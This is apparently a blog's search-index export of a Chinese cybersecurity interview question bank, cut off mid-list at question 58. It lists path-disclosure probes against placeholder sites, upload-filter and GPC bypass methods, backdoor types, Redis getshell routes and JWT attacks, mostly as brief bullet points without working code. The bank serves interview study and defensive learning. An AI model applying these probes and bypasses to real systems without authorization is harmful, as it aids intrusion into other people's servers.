<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>网络安全题库</title>
    <url>/2024/04/02/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BA%93/</url>
    <content><![CDATA[<h1 id="网络安全面试题"><a href="#网络安全面试题" class="headerlink" title="网络安全面试题"></a>网络安全面试题</h1><h2 id="1-php爆绝对路径的方法？"><a href="#1-php爆绝对路径的方法？" class="headerlink" title="1.php爆绝对路径的方法？"></a>1.php爆绝对路径的方法？</h2><h3 id="1-1单引号引起数据库报错"><a href="#1-1单引号引起数据库报错" class="headerlink" title="1.1单引号引起数据库报错"></a>1.1单引号引起数据库报错</h3><ul>
<li>说明：直接在URL后面加单引号，要求单引号没有被过滤(gpc&#x3D;off)且服务器默认返回错误信息。</li>
<li>举例：<a href="https://www.xxx.com/news.php?id=149">https://www.xxx.com/news.php?id=149</a>‘</li>
</ul>
<h3 id="1-2访问错误参数或错误路径"><a href="#1-2访问错误参数或错误路径" class="headerlink" title="1.2访问错误参数或错误路径"></a>1.2访问错误参数或错误路径</h3><ul>
<li>说明：将要提交的参数值改成错误值，比如**-1**</li>
<li>举例：<a href="https://www.xxx.com/researcharchive.php?id=-1">https://www.xxx.com/researcharchive.php?id=-1</a></li>
</ul>
<h3 id="1-3扫描开发未删除的测时文件-探针类文件如phpinfo"><a href="#1-3扫描开发未删除的测时文件-探针类文件如phpinfo" class="headerlink" title="1.3扫描开发未删除的测时文件&#x2F;探针类文件如phpinfo"></a>1.3扫描开发未删除的测时文件&#x2F;探针类文件如phpinfo</h3><ul>
<li><p>说明：部分开发人员和测试人员会将测试文件留着，这样可以借助扫描工具将其扫描出来也可以爆绝对路径。很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()</p>
</li>
<li><p>举例：</p>
<ul>
<li><p><a href="https://www.xxx.com/test.php">https://www.xxx.com/test.php</a></p>
</li>
<li><p><a href="https://www.xxx.com/ceshi.php">https://www.xxx.com/ceshi.php</a></p>
</li>
<li><p><a href="https://www.xxx.com/info.php">https://www.xxx.com/info.php</a></p>
</li>
<li><p><a href="https://www.xxx.com/phpinfo.php">https://www.xxx.com/phpinfo.php</a></p>
</li>
<li><p><a href="https://www.xxx.com/php_info.php">https://www.xxx.com/php_info.php</a></p>
</li>
<li><p><a href="https://www.xxx.com/1.php">https://www.xxx.com/1.php</a></p>
</li>
</ul>
</li>
</ul>
<h3 id="1-4google-hacking"><a href="#1-4google-hacking" class="headerlink" title="1.4google hacking"></a>1.4google hacking</h3><ul>
<li>说明：结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</li>
<li>举例：Site:xxx.edu.tw warning</li>
</ul>
<p>​		   Site:xxx.com.tw “fatal error”</p>
<h3 id="1-5phppmyadmin爆路径-phpmyadmin-libraries-lect-lang-lib-php"><a href="#1-5phppmyadmin爆路径-phpmyadmin-libraries-lect-lang-lib-php" class="headerlink" title="1.5phppmyadmin爆路径:&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php"></a>1.5phppmyadmin爆路径:&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php</h3><ul>
<li>说明：一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。</li>
<li>举例：<ul>
<li><a href="https://www.xxxx.cc/phpmyadmin/themes/darkblue_orange/layout.inc.php">https://www.xxxx.cc/phpmyadmin/themes/darkblue_orange/layout.inc.php</a></li>
<li><a href="https://www.xxx.cc/phpmyadmin/libraries/select_lang.lib.php">https://www.xxx.cc/phpmyadmin/libraries/select_lang.lib.php</a></li>
<li><a href="https://www.xxx.cc/phpmyadmin/libraries/mcrypt.lib.php">https://www.xxx.cc/phpmyadmin/libraries/mcrypt.lib.php</a></li>
<li><a href="https://www.xxxx.cc/phpmyadmin/index.php?lang%5B%5D=1">https://www.xxxx.cc/phpmyadmin/index.php?lang[]=1</a></li>
</ul>
</li>
</ul>
<h3 id="1-6利用漏洞读取配置文件找路径"><a href="#1-6利用漏洞读取配置文件找路径" class="headerlink" title="1.6利用漏洞读取配置文件找路径"></a>1.6利用漏洞读取配置文件找路径</h3><ul>
<li><p>说明：如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查</p>
</li>
<li><p>举例;</p>
<ul>
<li>Windows:<ul>
<li>c:windowsphp.iniphp	配置文件</li>
<li>c:windowssystem32inetsrvMetaBase.xml 	IIS虚拟主机配置文件</li>
</ul>
</li>
<li>Linux<ul>
<li>&#x2F;etc&#x2F;php.ini	php配置文件</li>
<li>&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</li>
<li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf	Apache配置文件</li>
<li>&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</li>
<li>&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</li>
<li>&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf 	虚拟目录配置文件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-7恶意使用网站功能"><a href="#1-7恶意使用网站功能" class="headerlink" title="1.7恶意使用网站功能"></a>1.7恶意使用网站功能</h3><p>说明：如本地图片读取功能读取不存在图片，上传点上传不能正常导入的文件；</p>
<h2 id="2-你常用的渗透工具有哪些，最长用的时那个"><a href="#2-你常用的渗透工具有哪些，最长用的时那个" class="headerlink" title="2.你常用的渗透工具有哪些，最长用的时那个"></a>2.你常用的渗透工具有哪些，最长用的时那个</h2><p>burp、nmap、sqlmap、awvs、蚁剑、冰蝎、dirsearch、御剑等等</p>
<h2 id="3-xss盲打到内网服务器的利用"><a href="#3-xss盲打到内网服务器的利用" class="headerlink" title="3.xss盲打到内网服务器的利用"></a>3.xss盲打到内网服务器的利用</h2><ul>
<li>钓鱼管理员</li>
<li>信息收集</li>
</ul>
<h2 id="4-鱼叉式攻击和水坑攻击？"><a href="#4-鱼叉式攻击和水坑攻击？" class="headerlink" title="4.鱼叉式攻击和水坑攻击？"></a>4.鱼叉式攻击和水坑攻击？</h2><ol>
<li>鱼叉攻击：指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马 </li>
<li>水坑攻击：分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，将网站攻破并植入恶意程序，等待目标访问</li>
</ol>
<h2 id="5-什么是虚拟机逃逸？"><a href="#5-什么是虚拟机逃逸？" class="headerlink" title="5.什么是虚拟机逃逸？"></a>5.什么是虚拟机逃逸？</h2><p>利用虚拟机软件或者虚拟机中运行的软件的漏洞进行攻击，以达到攻击或控制虚拟机宿主操作系统的目的</p>
<h2 id="6-中间人攻击的原理并且如何防御"><a href="#6-中间人攻击的原理并且如何防御" class="headerlink" title="6.中间人攻击的原理并且如何防御"></a>6.中间人攻击的原理并且如何防御</h2><ol>
<li><p>原理：在同一个局域网中，通过拦截正常的网络通信数据，并进行数据篡改和嗅探</p>
</li>
<li><p>防御：</p>
<ol>
<li>在主机绑定网关MAC与IP地址为静态</li>
<li>在网关绑定主机MAC与IP地址</li>
<li>使用ARP防火墙</li>
</ol>
</li>
</ol>
<h2 id="7-TCP三次握手过程？"><a href="#7-TCP三次握手过程？" class="headerlink" title="7.TCP三次握手过程？"></a>7.TCP三次握手过程？</h2><ul>
<li>第一次握手：建立连接时,客户端发送syn包(syn&#x3D;j)到服务器,并进入SYN_SEND状态,等待服务器确认</li>
<li>第二次握手：服务器收到syn包,必须确认客户的SYN（ack&#x3D;j+1）,同时自己也发送一个SYN包（syn&#x3D;k）,即SYN+ACK包,此时服务器进入SYN_RECV状态 </li>
<li>第三次握手：客户端收到服务器的SYN＋ACK包,向服务器发送确认包ACK(ack&#x3D;k+1),此包发送完毕,客户端和服务器进入ESTABLISHED状态</li>
</ul>
<h2 id="8-七层模型？"><a href="#8-七层模型？" class="headerlink" title="8.七层模型？"></a>8.七层模型？</h2><p>应用层、表示层、会话层、传输层、网络层、数据链路层、物理层</p>
<h2 id="9-对于云安全的理解"><a href="#9-对于云安全的理解" class="headerlink" title="9.对于云安全的理解"></a>9.对于云安全的理解</h2><p>融合了并行处理、网格计算、未知病毒行为判断等新兴技术和概念，通过网状的大量客户端对网络中软件行为的异常监测，获取互联网中木马、恶意程序的最新信息，传送到Server端进行自动分析和处理，再把病毒和木马的解决方案分发到每一个客户端</p>
<h2 id="10-了解过websocket吗？"><a href="#10-了解过websocket吗？" class="headerlink" title="10.了解过websocket吗？"></a>10.了解过websocket吗？</h2><p>WebSocket是一种在单个TCP连接上进行全双工通信的协议，最大特点是服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话。</p>
<h2 id="11-DDOS是什么？有哪些？CC攻击是什么？区别是什么？"><a href="#11-DDOS是什么？有哪些？CC攻击是什么？区别是什么？" class="headerlink" title="11.DDOS是什么？有哪些？CC攻击是什么？区别是什么？"></a>11.DDOS是什么？有哪些？CC攻击是什么？区别是什么？</h2><ul>
<li><p>DDOS：分布式拒绝服务攻击，利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应 </p>
</li>
<li><p>主要方式：</p>
<ul>
<li>SYN Flood </li>
<li>UDP Flood </li>
<li>ICMP Flood </li>
<li>Connection Flood </li>
<li>HTTP Get </li>
<li>UDP DNS Query Flood</li>
</ul>
</li>
<li><p>CC攻击：模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面，造成服务器资源的浪费，CPU长时间处于100%，网络拥塞</p>
</li>
<li><p>两者区别：</p>
<ul>
<li>CC攻击网页，DDOS攻击服务器，更难防御</li>
<li>CC门槛较低，DDOS需要大量服务器 </li>
<li>CC持续时间长，DDOS产生的影响大</li>
</ul>
</li>
</ul>
<h2 id="12-land攻击是什么"><a href="#12-land攻击是什么" class="headerlink" title="12.land攻击是什么"></a>12.land攻击是什么</h2><p>局域网拒绝服务攻击，DDOS攻击的一种，通过发送精心构造的、具有相同源地址和目标地址的欺骗数据包，致使缺乏相应防护机制的目标设备瘫痪</p>
<h2 id="13-你会如何进行信息收集？"><a href="#13-你会如何进行信息收集？" class="headerlink" title="13.你会如何进行信息收集？"></a>13.你会如何进行信息收集？</h2><ul>
<li>服务器信息：ip、中间件、操作系统 </li>
<li>域名whois、ipwhois、网段归属 </li>
<li>子域名探测 </li>
<li>网站目录扫描、接口信息扫描 </li>
<li>端口扫描 </li>
<li>各大引擎搜索相关信息</li>
</ul>
<h2 id="14-什么是CRLF注入攻击？"><a href="#14-什么是CRLF注入攻击？" class="headerlink" title="14.什么是CRLF注入攻击？"></a>14.什么是CRLF注入攻击？</h2><p>通过“回车”和“换行”字符注入HTTP流，实现网站篡改、跨站脚本、劫持等。</p>
<h2 id="15-防止XSS，前端后端两个角度？"><a href="#15-防止XSS，前端后端两个角度？" class="headerlink" title="15.防止XSS，前端后端两个角度？"></a>15.防止XSS，前端后端两个角度？</h2><ul>
<li><p>前端：</p>
<ul>
<li>用户输入特殊字符过滤转义为html实体 </li>
<li>用户输出编码</li>
</ul>
</li>
<li><p>后端：</p>
<ul>
<li>实体化编码 </li>
<li>函数过滤 </li>
<li>限制字符长度</li>
</ul>
</li>
</ul>
<h2 id="16-如何防护一个端口的安全？"><a href="#16-如何防护一个端口的安全？" class="headerlink" title="16.如何防护一个端口的安全？"></a>16.如何防护一个端口的安全？</h2><ul>
<li>利用WAF、IDS、IPS等设备 </li>
<li>危险服务端口禁止对外访问或限制IP访问 </li>
<li>服务定期更新版本</li>
</ul>
<h2 id="17-webshell检测思路？"><a href="#17-webshell检测思路？" class="headerlink" title="17.webshell检测思路？"></a>17.webshell检测思路？</h2><ul>
<li>静态检测：匹配特征码，特征值，危险函数 </li>
<li>动态检测：WAF、IDS等设备 </li>
<li>日志检测：通过IP访问规律，页面访问规律筛选 </li>
<li>文件完整性监控</li>
</ul>
<h2 id="18-发现IIS的网站，怎样试它的漏洞？（根据版本）"><a href="#18-发现IIS的网站，怎样试它的漏洞？（根据版本）" class="headerlink" title="18.发现IIS的网站，怎样试它的漏洞？（根据版本）"></a>18.发现IIS的网站，怎样试它的漏洞？（根据版本）</h2><p><a href="https://link.juejin.cn/?target=https://mp.weixin.qq.com/s/5XV984kErF2Zhh-P5aoUwQ">mp.weixin.qq.com&#x2F;s&#x2F;5XV984kEr…</a></p>
<h2 id="19-GPC是什么？开启了怎么绕过"><a href="#19-GPC是什么？开启了怎么绕过" class="headerlink" title="19.GPC是什么？开启了怎么绕过"></a>19.GPC是什么？开启了怎么绕过</h2><ul>
<li><p>GPC：</p>
<ul>
<li>php.ini配置文件中的magic_quotes_gpc，实现为get、post、cookie传入的单引号、双引号、反斜线、NULL字符添加反斜线<code>\</code></li>
</ul>
</li>
<li><p>绕过：</p>
<ul>
<li>PHP5的GPC对$_SERVER的忽略，可在http请求头注入 </li>
<li>二次注入 </li>
<li>宽字节注入</li>
</ul>
</li>
</ul>
<h2 id="20-web常用的加密算法有什么"><a href="#20-web常用的加密算法有什么" class="headerlink" title="20.web常用的加密算法有什么"></a>20.web常用的加密算法有什么</h2><ul>
<li>单向散列加密 MD5、SHA、MAC </li>
<li>对称加密 AES、DES </li>
<li>非对称加密 RSA、RSA2</li>
</ul>
<h2 id="21-XSS除了获取cookies还能做什么？"><a href="#21-XSS除了获取cookies还能做什么？" class="headerlink" title="21.XSS除了获取cookies还能做什么？"></a>21.XSS除了获取cookies还能做什么？</h2><ul>
<li>获取管理员ip </li>
<li>xss蠕虫 </li>
<li>钓鱼攻击 </li>
<li>前端JS挖矿 </li>
<li>键盘记录 </li>
<li>屏幕截图</li>
</ul>
<h2 id="22-运营商（或其他）网络劫持"><a href="#22-运营商（或其他）网络劫持" class="headerlink" title="22.运营商（或其他）网络劫持"></a>22.运营商（或其他）网络劫持</h2><ul>
<li>运营商劫持：广告投放 </li>
<li>DNS劫持：通过各种手段篡改DNS，劫持网络</li>
</ul>
<h2 id="23-DNS欺骗是什么"><a href="#23-DNS欺骗是什么" class="headerlink" title="23.DNS欺骗是什么"></a>23.DNS欺骗是什么</h2><p>攻击者冒充域名服务器的一种欺骗行为</p>
<h2 id="24-缓冲区溢出原理和防御"><a href="#24-缓冲区溢出原理和防御" class="headerlink" title="24.缓冲区溢出原理和防御"></a>24.缓冲区溢出原理和防御</h2><ul>
<li><p>原理：</p>
<ul>
<li>当写入缓冲区的数据量超过该缓冲区所能承受的最大限度时，发生缓冲区溢出，溢出的数据被黑客加以利用，形成远程代码执行漏洞。</li>
</ul>
</li>
<li><p>防御：</p>
<ul>
<li>基于操作系统防御 </li>
<li>缓冲区边界检查 </li>
<li>安全编程</li>
</ul>
</li>
</ul>
<h2 id="25-网络安全事件应急响应"><a href="#25-网络安全事件应急响应" class="headerlink" title="25.网络安全事件应急响应"></a>25.网络安全事件应急响应</h2><ul>
<li>断网：条件允许时优先断网，防止黑客进一步操作或删除痕迹 </li>
<li>取证：通过分析登录日志、网站日志、服务日志寻找黑客ip，查看黑客进行的操作 </li>
<li>备份：备份服务器文件，对比入侵前后产生变化的文件 </li>
<li>查漏：通过上述步骤寻找业务薄弱点，修补漏洞 </li>
<li>杀毒：清除黑客留下的后门、webshell、管理账号 </li>
<li>溯源：通过黑客ip地址，入侵手段等 </li>
<li>记录：归档、预防</li>
</ul>
<h2 id="26-企业内部安全"><a href="#26-企业内部安全" class="headerlink" title="26.企业内部安全"></a>26.企业内部安全</h2><ul>
<li>实名制联网 </li>
<li>重要网段隔离 </li>
<li>禁止接入任何USB设备 </li>
<li>禁用WIFI网络 </li>
<li>IP与MAC地址绑定 </li>
<li>部署网络监控、IDS、IPS设备 </li>
<li>定期培训，提高员工安全意识</li>
</ul>
<h2 id="27-业务上线前，怎么测试，从哪些角度测试"><a href="#27-业务上线前，怎么测试，从哪些角度测试" class="headerlink" title="27.业务上线前，怎么测试，从哪些角度测试"></a>27.业务上线前，怎么测试，从哪些角度测试</h2><ul>
<li>安全测试：寻找产品漏洞，页面漏洞，服务漏洞，敏感信息泄露，逻辑漏洞，弱口令 </li>
<li>性能测试：压力测试 </li>
<li>功能完整性测试</li>
</ul>
<h2 id="28-应用有漏洞，但是无法修复和停用，你怎么办"><a href="#28-应用有漏洞，但是无法修复和停用，你怎么办" class="headerlink" title="28.应用有漏洞，但是无法修复和停用，你怎么办"></a>28.应用有漏洞，但是无法修复和停用，你怎么办</h2><ul>
<li>限制IP白名单访问 </li>
<li>使用WAF、IDS、防火墙设备</li>
</ul>
<h2 id="29-CSRF怎么防护？"><a href="#29-CSRF怎么防护？" class="headerlink" title="29.CSRF怎么防护？"></a>29.CSRF怎么防护？</h2><ul>
<li>验证HTTP Referer字段 </li>
<li>添加Token字段并验证 </li>
<li>添加自定义字段并验证</li>
</ul>
<h2 id="30-文件上传绕过方法？"><a href="#30-文件上传绕过方法？" class="headerlink" title="30.文件上传绕过方法？"></a>30.文件上传绕过方法？</h2><ul>
<li><p>WAF绕过：</p>
<ul>
<li>修改上传表单字段 </li>
<li>表单字段大小写替换 </li>
<li>表单字段增加或减少空格 </li>
<li>表单字段字符串拼接 </li>
<li>构造双文件上传表单，同时上传双文件</li>
<li>编码绕过 </li>
<li>垃圾数据填充绕过 </li>
<li>文件名大小写绕过</li>
</ul>
</li>
<li><p>服务器检测绕过：</p>
<ul>
<li>MIME类型绕过 </li>
<li>前端JS检测抓包改包绕过 </li>
<li>黑名单绕过：php3、asa、ashx、windows特性（test.asp_、流特性）、apache解析漏洞 </li>
<li>图片内容检测使用图片马绕过 </li>
<li>.htassess绕过</li>
</ul>
</li>
<li><p>白名单检测绕过：</p>
<ul>
<li>截断上传绕过</li>
<li>IIS6&#x2F;7&#x2F;7.5解析漏洞，nginx低版本解析漏洞 </li>
<li>文件包含绕过</li>
</ul>
</li>
</ul>
<h2 id="31-验证码相关利用点"><a href="#31-验证码相关利用点" class="headerlink" title="31.验证码相关利用点"></a>31.验证码相关利用点</h2><ul>
<li>验证码复用 </li>
<li>验证码可识别 </li>
<li>验证码失效 </li>
<li>验证码DDOS</li>
</ul>
<h2 id="32-cookie你会测试什么内容"><a href="#32-cookie你会测试什么内容" class="headerlink" title="32.cookie你会测试什么内容"></a>32.cookie你会测试什么内容</h2><ul>
<li>sql注入 </li>
<li>xss </li>
<li>权限绕过</li>
<li>敏感信息泄露</li>
</ul>
<h2 id="33-说出几个业务逻辑漏洞类型？"><a href="#33-说出几个业务逻辑漏洞类型？" class="headerlink" title="33.说出几个业务逻辑漏洞类型？"></a>33.说出几个业务逻辑漏洞类型？</h2><ul>
<li>任意用户密码重置 </li>
<li>短信轰炸 </li>
<li>订单金额修改 </li>
<li>忘记密码绕过 </li>
<li>恶意刷票 </li>
<li>验证码复用</li>
</ul>
<h2 id="34-简述文件包含漏洞"><a href="#34-简述文件包含漏洞" class="headerlink" title="34.简述文件包含漏洞"></a>34.简述文件包含漏洞</h2><p>调用文件包含函数时，未严格限制文件名和路径，如include()、require()等函数</p>
<h2 id="35-业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的？"><a href="#35-业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的？" class="headerlink" title="35.业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的？"></a>35.业务逻辑漏洞，用户任意密码重置有什么例子，因为什么因素导致的？</h2><ul>
<li>普通用户重置<strong>管理</strong>用户密码 </li>
<li>普通用户重置<strong>普通</strong>用户密码</li>
<li>未设置用户唯一Token，导致越权</li>
</ul>
<h2 id="36-渗透测试过程中发现一个只能上传zip文件的功能，有什么可能的思路？"><a href="#36-渗透测试过程中发现一个只能上传zip文件的功能，有什么可能的思路？" class="headerlink" title="36.渗透测试过程中发现一个只能上传zip文件的功能，有什么可能的思路？"></a>36.渗透测试过程中发现一个只能上传zip文件的功能，有什么可能的思路？</h2><ul>
<li>shell压缩上传，程序自解压getshell </li>
<li>尝试解析漏洞getshell </li>
<li>寻找文件包含漏洞 </li>
<li>木马钓鱼管理员</li>
</ul>
<h2 id="37-为什么aspx木马权限比asp大？"><a href="#37-为什么aspx木马权限比asp大？" class="headerlink" title="37.为什么aspx木马权限比asp大？"></a>37.为什么aspx木马权限比asp大？</h2><p>aspx使用的是.net技术,IIS中默认不支持，ASPX需要依赖于.net framework，ASP只是脚本语言, 入侵的时候asp的木马一般是guest权限APSX的木马一般是users权限</p>
<h2 id="38-只有一个登录页面有哪些思路？"><a href="#38-只有一个登录页面有哪些思路？" class="headerlink" title="38.只有一个登录页面有哪些思路？"></a>38.只有一个登录页面有哪些思路？</h2><ul>
<li><p>SQL注入、万能密码 </p>
</li>
<li><p>暴力破解 </p>
</li>
<li><p>权限绕过 </p>
</li>
<li><p>目录扫描 </p>
</li>
<li><p>敏感信息泄露</p>
</li>
</ul>
<h2 id="39-请求头中哪些是有危害的？"><a href="#39-请求头中哪些是有危害的？" class="headerlink" title="39.请求头中哪些是有危害的？"></a>39.请求头中哪些是有危害的？</h2><ul>
<li>COOKIE注入 </li>
<li>user-agent注入 </li>
<li>X-Forwarded-For注入 </li>
<li>Referer注入</li>
</ul>
<h2 id="40-谈谈水平-垂直-未授权越权访问的区别"><a href="#40-谈谈水平-垂直-未授权越权访问的区别" class="headerlink" title="40.谈谈水平&#x2F;垂直&#x2F;未授权越权访问的区别?"></a>40.谈谈水平&#x2F;垂直&#x2F;未授权越权访问的区别?</h2><ul>
<li>水平越权：普通用户越权访问普通用户 </li>
<li>垂直越权：普通用户越权访问管理用户 </li>
<li>未授权访问：权限控制不严，导致无需登录访问已登录用户页面</li>
</ul>
<h2 id="41-xss有什么？执行存储型的xss的危害和原理"><a href="#41-xss有什么？执行存储型的xss的危害和原理" class="headerlink" title="41.xss有什么？执行存储型的xss的危害和原理"></a>41.xss有什么？执行存储型的xss的危害和原理</h2><ul>
<li><p>存储型、反射型、DOM型 </p>
</li>
<li><p>原理：</p>
<ul>
<li>存储型XSS是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库</li>
</ul>
</li>
<li><p>存储型XSS危害：</p>
<ul>
<li>窃取用户Cookie </li>
<li>XSS钓鱼攻击 </li>
<li>XSS蠕虫攻击 </li>
<li>获取键盘记录 </li>
<li>获取用户信息 </li>
<li>获取屏幕截图</li>
</ul>
</li>
</ul>
<h2 id="42-主机疑似遭到入侵，要看哪里的日志"><a href="#42-主机疑似遭到入侵，要看哪里的日志" class="headerlink" title="42.主机疑似遭到入侵，要看哪里的日志"></a>42.主机疑似遭到入侵，要看哪里的日志</h2><ul>
<li>系统登录日志 </li>
<li>服务访问日志 </li>
<li>网站日志 </li>
<li>数据库日志</li>
</ul>
<h2 id="43-python常用的标准库"><a href="#43-python常用的标准库" class="headerlink" title="43.python常用的标准库"></a>43.python常用的标准库</h2><ul>
<li>正则表达式 re </li>
<li>时间模块 time </li>
<li>随机数 random </li>
<li>操作系统接口 os </li>
<li>科学计算 math </li>
<li>网络请求 urlib </li>
<li>http库 requests </li>
<li>爬虫库 Scrapy </li>
<li>多线程库 threading</li>
</ul>
<h2 id="44-reverse-tcp-和-bind-tcp-的区别？"><a href="#44-reverse-tcp-和-bind-tcp-的区别？" class="headerlink" title="44.reverse_tcp 和 bind_tcp 的区别？"></a>44.reverse_tcp 和 bind_tcp 的区别？</h2><ul>
<li>reverse_tcp：攻击机设置一个端口和IP，Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接 白话就是让受控机主动连接我们</li>
<li>bind_tcp：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入 白话就是我们主动连接受控机 </li>
<li>使用reverse_tcp较为安全，一般不会被防火墙发现</li>
</ul>
<h2 id="45-oauth认证过程中可能会出现什么问题，导致什么样的漏洞"><a href="#45-oauth认证过程中可能会出现什么问题，导致什么样的漏洞" class="headerlink" title="45.oauth认证过程中可能会出现什么问题，导致什么样的漏洞?"></a>45.oauth认证过程中可能会出现什么问题，导致什么样的漏洞?</h2><ul>
<li>CSRF </li>
<li>redirect_uri校验不严格 </li>
<li>错误的参数传递</li>
</ul>
<h2 id="46-做了cdn的网站如何获取真实IP"><a href="#46-做了cdn的网站如何获取真实IP" class="headerlink" title="46.做了cdn的网站如何获取真实IP"></a>46.做了cdn的网站如何获取真实IP</h2><ul>
<li>全球ping </li>
<li>查询历史解析记录 </li>
<li>探针文件如phpinfo等 </li>
<li>利用命令执行连接我们的服务器或DNSlog </li>
<li>寻找网站配置 </li>
<li>通过二级域名 </li>
<li>全网扫描，title匹配</li>
</ul>
<h2 id="47-如何实现跨域？"><a href="#47-如何实现跨域？" class="headerlink" title="47.如何实现跨域？"></a>47.如何实现跨域？</h2><ul>
<li>jsonp </li>
<li>CORS跨域资源共享 </li>
<li>代理跨域请求 </li>
<li>Html5 postMessage 方法 </li>
<li>修改 document.domain 跨子域 </li>
<li>基于 Html5 websocket 协议 </li>
<li>document.xxx + iframe</li>
</ul>
<h2 id="48-jsonp跨域与CORS跨域的区别？"><a href="#48-jsonp跨域与CORS跨域的区别？" class="headerlink" title="48.jsonp跨域与CORS跨域的区别？"></a>48.jsonp跨域与CORS跨域的区别？</h2><ul>
<li>jsonp浏览器支持较好，CORS不支持IE9及以下浏览器 </li>
<li>jsonp只支持GET，CORS支持所有类型的HTTP请求 </li>
<li>jsonp只发一次请求，复杂请求CORS发送两次</li>
</ul>
<h2 id="49-SSRF漏洞利用？"><a href="#49-SSRF漏洞利用？" class="headerlink" title="49.SSRF漏洞利用？"></a>49.SSRF漏洞利用？</h2><ul>
<li>本地文件读取 </li>
<li>服务探测、端口扫描 </li>
<li>攻击内网redis、mysql、fastcgi等服务</li>
</ul>
<p>利用到的协议有：http&#x2F;s、file、gopher、tftp、dict、ssh、telnet</p>
<h2 id="50-常见后门方式？"><a href="#50-常见后门方式？" class="headerlink" title="50.常见后门方式？"></a>50.常见后门方式？</h2><ul>
<li><p>Windows:</p>
<ul>
<li>注册表自启动 </li>
<li>shift后门 </li>
<li>远控软件 </li>
<li>webshell </li>
<li>添加管理用户</li>
<li>影子用户 </li>
<li>定时任务 </li>
<li>dll劫持 </li>
<li>注册表劫持 </li>
<li>MBR后门 </li>
<li>WMI后门 </li>
<li>管理员密码记录</li>
</ul>
</li>
<li><p>Linux:</p>
<ul>
<li>SSH后门 </li>
<li>SUID后门 </li>
<li>Crontab计划任务 </li>
<li>PAM后门 </li>
<li>添加管理员账号 Rootkit</li>
<li>Rootkit</li>
</ul>
</li>
</ul>
<h2 id="51-open-basedir访问目录限制绕过方法？"><a href="#51-open-basedir访问目录限制绕过方法？" class="headerlink" title="51.open_basedir访问目录限制绕过方法？"></a>51.open_basedir访问目录限制绕过方法？</h2><ul>
<li>使用命令执行函数绕过 </li>
<li>使用symlink()函数绕过 </li>
<li>glob伪协议绕过</li>
</ul>
<h2 id="52-PHP代码审计中容易出问题的点？"><a href="#52-PHP代码审计中容易出问题的点？" class="headerlink" title="52.PHP代码审计中容易出问题的点？"></a>52.PHP代码审计中容易出问题的点？</h2><ul>
<li>参数拼接方式皆有可能产生SQL注入（老生常谈） </li>
<li>全局变量注册导致的变量覆盖 </li>
<li>fwrite参数未过滤导致的代码执行 </li>
<li>权限校验疏漏导致的后台功能访问 </li>
<li>接口任意文件上传 </li>
<li>unserialize反序列化漏洞</li>
</ul>
<h2 id="53-红蓝对抗中蓝队反杀红队场景和姿势？"><a href="#53-红蓝对抗中蓝队反杀红队场景和姿势？" class="headerlink" title="53.红蓝对抗中蓝队反杀红队场景和姿势？"></a>53.红蓝对抗中蓝队反杀红队场景和姿势？</h2><p>钓鱼、蜜罐、蚁剑RCE</p>
<h2 id="54-linux计划任务，黑客隐藏自己的计划任务会怎么做？"><a href="#54-linux计划任务，黑客隐藏自己的计划任务会怎么做？" class="headerlink" title="54.linux计划任务，黑客隐藏自己的计划任务会怎么做？"></a>54.linux计划任务，黑客隐藏自己的计划任务会怎么做？</h2><p>临时任务：at、batch命令</p>
<h2 id="55-Redis未授权常见getshell的几种方式？"><a href="#55-Redis未授权常见getshell的几种方式？" class="headerlink" title="55.Redis未授权常见getshell的几种方式？"></a>55.Redis未授权常见getshell的几种方式？</h2><ul>
<li>web绝对路径写shell </li>
<li>写入ssh公钥获取服务器权限 </li>
<li>主从复制getshell</li>
</ul>
<h2 id="56-JWT的攻击手法？（头部、负载、签名）"><a href="#56-JWT的攻击手法？（头部、负载、签名）" class="headerlink" title="56.JWT的攻击手法？（头部、负载、签名）"></a>56.JWT的攻击手法？（头部、负载、签名）</h2><ul>
<li>加密算法置为空绕过身份验证 </li>
<li>爆破弱密钥 </li>
<li>kid参数：任意文件读取、SQL注入、命令注入 </li>
<li>未校验签名，内容重新编码</li>
</ul>
<h2 id="57-JAVA中间件的漏洞，举几个例子？"><a href="#57-JAVA中间件的漏洞，举几个例子？" class="headerlink" title="57.JAVA中间件的漏洞，举几个例子？"></a>57.JAVA中间件的漏洞，举几个例子？</h2><ul>
<li>JBoss反序列化 </li>
<li>WebLogic反序列化 </li>
<li>Tomcat任意文件写入、弱口令+后台getshell</li>
</ul>
<h2 id="58-DNS外带可以用在哪些漏洞？"><a href="#58-DNS外带可以用在哪些漏洞？" class="headerlink" title="58.DNS外带可以用在哪些漏洞？"></a>58.DNS外带可以用在哪些漏洞？</h2><ul>
<li>SQL盲注 </li>
<li>无回显的命令执行 </li>
